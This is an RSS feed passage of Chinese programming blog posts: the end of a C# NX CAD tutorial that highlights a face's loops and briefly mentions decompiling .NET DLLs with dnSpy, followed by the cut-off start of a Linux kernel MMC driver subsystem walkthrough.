    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;face&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;输入面的tag&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;loops&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;输出lopps链表&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; MyAskFaceLoops(Tag face, &lt;span&gt;out&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt; loops)
    {
        NXOpen.Utilities.JAM.StartUFCall();
        loops &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt;();
        IntPtr loopList &lt;/span&gt;=&lt;span&gt; IntPtr.Zero;
        OpenAPI.AskFaceLoops(face, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopList);

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; loopCount = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        OpenAPI.AskLoopListCount(loopList, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopCount);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; listPtrList = &lt;span&gt;new&lt;/span&gt; List&amp;lt;IntPtr&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; loopCount; i++&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; tagList = &lt;span&gt;new&lt;/span&gt; List&amp;lt;Tag&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; type = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            IntPtr list &lt;/span&gt;=&lt;span&gt; IntPtr.Zero;
            OpenAPI.AskLoopListItem(loopList, i, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt; type, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; list);
            listPtrList.Add(list);
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; listCount = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            OpenAPI.AskListCount(list, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; listCount);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; listCount; j++&lt;span&gt;)
            {
                Tag obj &lt;/span&gt;=&lt;span&gt; Tag.Null;
                OpenAPI.AskListItem(list, j, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; obj);
                tagList.Add(obj);
            }
            loops.Add(tagList);
            OpenAPI.DeleteList(&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; list);
        }
        OpenAPI.DeleteLoopList(&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopList);
        NXOpen.Utilities.JAM.EndUFCall();
    }


    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;  Explicit Activation
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;      This entry point is used to activate the application explicitly
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
    {
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; retValue = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            theProgram &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Program();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO: Add your application code here &lt;/span&gt;
&lt;span&gt;

            Tag aa &lt;/span&gt;= (Tag)&lt;span&gt;47147&lt;/span&gt;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;通过移刀工具得到面的tag&lt;/span&gt;
            theUfSession.Obj.SetColor(aa, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获得面的所有loop&lt;/span&gt;
            List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt; loops = &lt;span&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt;();
            MyAskFaceLoops(aa, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loops);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;高亮面的所有loop&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; loops.Count; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; loops[i].Count; j++&lt;span&gt;)
                {
                    theUfSession.Ui.DisplayMessage(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
                    theUfSession.Disp.SetHighlight(loops[i][j], &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
                }
            }


            theProgram.Dispose();
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----&lt;/span&gt;
&lt;span&gt;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; retValue;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Following method disposes all the class members
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Dispose()
    {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDisposeCalled == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO: Add your application code here &lt;/span&gt;
&lt;span&gt;            }
            isDisposeCalled &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----&lt;/span&gt;
&lt;span&gt;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; GetUnloadOption(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; arg)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image explicitly, via an unload dialog
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;return System.Convert.ToInt32(Session.LibraryUnloadOption.Explicitly);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image immediately after execution within NX&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; System.Convert.ToInt32(Session.LibraryUnloadOption.Immediately);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image when the NX session terminates
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; return System.Convert.ToInt32(Session.LibraryUnloadOption.AtTermination);&lt;/span&gt;
&lt;span&gt;    }

}


Caesar卢尚宇
2020年9月29日&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929205600692-1132027501.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;6.反编译别人的NX二次开发.net.dll源代码&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里博主我不提倡随便就去反编译别人的源代码，要尊重作者的开发成果。&lt;/p&gt;
&lt;p&gt;至于什么时候，反编译，自行斟酌吧，哈哈~~。&lt;/p&gt;
&lt;p&gt;在不加壳，加密的时候，.net很容易被反编译，加壳也能去破解的，毕竟是托管语言，只要在中间就能反编译，不像C++那种直接到内存中。&lt;/p&gt;
&lt;p&gt;例子：就用我上面写的loop例子，用DnSpy反编译源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929211145700-898220612.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929211220476-1848978276.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;Caesar卢尚宇&lt;/p&gt;
&lt;p&gt;2020年9月29日&lt;/p&gt;

</description>
<pubDate>Tue, 29 Sep 2020 13:14:00 +0000</pubDate>
<dc:creator>Caesar卢尚宇</dc:creator>
<og:description>在写这篇文章的时候，我正在头晕，因为下班坐车回家，有些晕车了。头疼的要死。也吃不下去饭。 早就想些这篇文章了，但是最近临近中秋十一，晚上太忙了。 版本：NX11+VS2013 最近这一年已经由C++过</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nxopen2018/p/13751886.html</dc:identifier>
</item>
<item>
<title>Linux MMC 驱动子系统简述（源码剖析） - hueyxu</title>
<link>http://www.cnblogs.com/hueyxu/p/13751636.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hueyxu/p/13751636.html</guid>
<description>&lt;p&gt;Linux内核设计了MMC子系统，用于管理MMC/SD设备。本文通过内核源码（Linux Kernel 5.2）对MMC驱动子系统进行简述，通过MMC驱动的实际案例说明MMC驱动编写的一般步骤，并分析驱动模型下完成驱动、设备绑定的过程。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;127.43222284261&quot;&gt;

&lt;p&gt;&lt;span&gt;块设备是Linux系统中的基础外设之一，而 MMC/SD 存储设备是一种典型的块设备。Linux内核设计了 &lt;strong&gt;MMC子系统&lt;/strong&gt;，用于管理 MMC/SD 设备。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;MMC 子系统的框架结构如下图所示，其中&lt;strong&gt;core layer&lt;/strong&gt;根据MMC/SD设备协议标准实现了协议。&lt;strong&gt;card layer&lt;/strong&gt;与Linux的块设备子系统对接，实现块设备驱动以及完成请求，具体协议经过&lt;strong&gt;core layer&lt;/strong&gt;的接口，最终通过&lt;strong&gt;host layer&lt;/strong&gt;完成传输，对 MMC设备进行实际的操作。和 MMC设备硬件相对应，&lt;strong&gt;host&lt;/strong&gt;和card可以分别理解为 MMC device的两个子设备：MMC主设备和MMC从设备，其中host为集成于MMC设备内部的MMC controller，card为MMC设备内部实际的存储设备。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hughesxu.github.io/assets/img/sample/mmc_subsystem.svg&quot; alt=&quot;MMC Subsystem&quot; width=&quot;159&quot; height=&quot;331&quot; data-loaded=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Linux系统中，使用两个结构体 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt; 和 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt; 分别描述host和card，其中host设备被封装成 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt; 注册到Linux驱动模型中。整体而言，（Linux驱动模型框架下）MMC驱动子系统包括三个部分：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;MMC总线（ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt; ）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;封装在 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;下的host设备&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;依附于MMC总线的MMC驱动（ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt; ）&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;下文将通过内核源码（Linux Kernel 5.2）对MMC驱动子系统进行简述，并通过MMC驱动的实际案例说明MMC驱动编写的一般步骤，同时分析驱动模型下完成驱动、设备绑定的过程。如对Linux设备驱动模型不熟悉，可以参考另一篇博文：&lt;a href=&quot;https://www.cnblogs.com/hueyxu/p/13659262.html&quot;&gt;Linux设备驱动模型简述（源码剖析）&lt;/a&gt;。&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;MMC总线的注册和 &lt;span class=&quot;cnblogs_code&quot;&gt;platform&lt;/span&gt; 总线的注册方法相同，均是调用 &lt;span class=&quot;cnblogs_code&quot;&gt;bus_register()&lt;/span&gt; 函数。函数的调用入口位于 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc/core/core.c&lt;/span&gt; ，通过 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init()&lt;/span&gt; 实现，此处主要关注MMC的部分。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/core.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
subsys_initcall(mmc_init);

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; __init mmc_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    ret &lt;/span&gt;=&lt;span&gt; mmc_register_bus();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;

    ret &lt;/span&gt;=&lt;span&gt; mmc_register_host_class();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; unregister_bus;

    ret &lt;/span&gt;=&lt;span&gt; sdio_register_bus();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; unregister_host_class;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

unregister_host_class:
    mmc_unregister_host_class();
unregister_bus:
    mmc_unregister_bus();
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************************************
 * mmc bus 总线注册
 **********************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; bus_type mmc_bus_type =&lt;span&gt; {
    .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    .dev_groups &lt;/span&gt;=&lt;span&gt; mmc_dev_groups,
    .match      &lt;/span&gt;=&lt;span&gt; mmc_bus_match,
    .uevent     &lt;/span&gt;=&lt;span&gt; mmc_bus_uevent,
    .probe      &lt;/span&gt;=&lt;span&gt; mmc_bus_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; mmc_bus_remove,
    .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_bus_shutdown,
    .pm         &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_bus_pm_ops,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_register_bus(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; bus_register(&amp;amp;&lt;span&gt;mmc_bus_type);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************************************
 * mmc_host class 类注册
 **********************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; mmc_host_class =&lt;span&gt; {
    .name           &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    .dev_release    &lt;/span&gt;=&lt;span&gt; mmc_host_classdev_release,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_register_host_class(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; class_register(&amp;amp;&lt;span&gt;mmc_host_class);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;主要包括两个方面：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;利用 &lt;span class=&quot;cnblogs_code&quot;&gt;bus_register()&lt;/span&gt; 注册 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt; 。对应sysfs下的 &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/bus/mmc/&lt;/span&gt; 目录。&lt;/li&gt;
&lt;li&gt;利用 &lt;span class=&quot;cnblogs_code&quot;&gt;class_register()&lt;/span&gt; 注册 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_class&lt;/span&gt; 。对应&lt;span&gt;sysfs&lt;/span&gt;下的 &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/&lt;span&gt;class&lt;/span&gt;/mmc_host&lt;/span&gt; 目录。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;drivers/mmc/core/block.c&lt;/span&gt; 中将 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt; 注册到 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt; 对应的总线系统里。主要步骤包括：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过 &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev()&lt;/span&gt; 向内核注册块设备。&lt;/li&gt;
&lt;li&gt;调用 &lt;span class=&quot;cnblogs_code&quot;&gt;driver_register()&lt;/span&gt; 将 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt; 注册到 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt; 总线系统。和其他驱动注册方式一致。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt; 注册完成之后，会在sysfs中建立目录 &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/bus/mmc/drivers/mmcblk&lt;/span&gt; 。&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/block.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;

module_init(mmc_blk_init);

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_driver mmc_driver =&lt;span&gt; {
    .drv        &lt;/span&gt;=&lt;span&gt; {
        .name   &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmcblk&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        .pm     &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_blk_pm_ops,
    },
    .probe      &lt;/span&gt;=&lt;span&gt; mmc_blk_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; mmc_blk_remove,
    .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_blk_shutdown,
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; __init mmc_blk_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; res;

    ...  ...
    res &lt;/span&gt;= register_blkdev(MMC_BLOCK_MAJOR, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    ...

    res &lt;/span&gt;= mmc_register_driver(&amp;amp;&lt;span&gt;mmc_driver);
    ...

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...
}

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;*
 *  mmc_register_driver - register a media driver
 *  @drv: MMC media driver
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_register_driver(&lt;span&gt;struct&lt;/span&gt; mmc_driver *&lt;span&gt;drv)
{
    drv&lt;/span&gt;-&amp;gt;drv.bus = &amp;amp;&lt;span&gt;mmc_bus_type;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; driver_register(&amp;amp;drv-&amp;gt;&lt;span&gt;drv);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;前文已经简单描述过，MMC设备主要包括主设备host和从设备card两部分，而主设备host将被封装在 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt; 中注册到驱动模型中。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;为了更加清晰地描述此部分的注册过程，下文将以一个驱动为例分析（此驱动源码只包含关键步骤代码，只为描述MMC驱动的编写基本框架，&lt;a href=&quot;https://github.com/hughesxu/workspace/blob/master/linux_modules/mmc/klm_mmc.c&quot;&gt;demo mmc driver&lt;/a&gt;)。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;module_init(xxx_mmc_init);

&lt;/span&gt;&lt;span&gt;#define&lt;/span&gt; DRIVER_NAME &quot;xxx_mmc&quot;

&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; platform driver definition &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; platform_driver xxx_mmc_driver =&lt;span&gt; {
    .probe      &lt;/span&gt;=&lt;span&gt; xxx_mmc_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; xxx_mmc_remove,
    .driver     &lt;/span&gt;=&lt;span&gt; {
        .name   &lt;/span&gt;=&lt;span&gt; DRIVER_NAME,
    },
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; platform_device *&lt;span&gt;pdev;
&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; __init &lt;span&gt;int&lt;/span&gt; xxx_mmc_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; err  = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
     * Register platform driver into driver model
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将xxx_mmc_driver注册到驱动模型中&lt;/span&gt;
    err = platform_driver_register(&amp;amp;&lt;span&gt;xxx_mmc_driver);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
     * Allocate platform device and register into driver model
     * This will call driver-&amp;gt;probe()
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态分配platform_device，并将其注册到驱动模型中
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此过程会回调driver-&amp;gt;probe()函数&lt;/span&gt;
    pdev = platform_device_alloc(DRIVER_NAME, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
    err &lt;/span&gt;=&lt;span&gt; platform_device_add(pdev);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 从代码中看到，驱动入口函数中将注册 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_driver&lt;/span&gt; 和 &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt; ， &lt;span class=&quot;cnblogs_code&quot;&gt;name&lt;/span&gt; 均定义为 &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc&lt;/span&gt; 。根据驱动模型，最终会回调 &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_driver&lt;/span&gt; 中的 &lt;span class=&quot;cnblogs_code&quot;&gt;probe()&lt;/span&gt; 函数： &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_probe()&lt;/span&gt; 。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;41-xxx_mmc_probepdev&quot;&gt;&lt;span&gt;4.1 xxx_mmc_probe(pdev)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 自定义的mmc_host_ops，用于host做实际操作时回调&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_host_ops xxx_mmc_ops =&lt;span&gt; {
    .request    &lt;/span&gt;=&lt;span&gt; xxx_mmc_request,
    .set_ios    &lt;/span&gt;=&lt;span&gt; xxx_mmc_set_ios,
};


&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; platform driver probe function &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; xxx_mmc_probe(&lt;span&gt;struct&lt;/span&gt; platform_device *&lt;span&gt;pdev)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;mmc;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; xxx_mmc_host *host =&lt;span&gt; NULL;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; ret = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 1: Allocate host structure &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
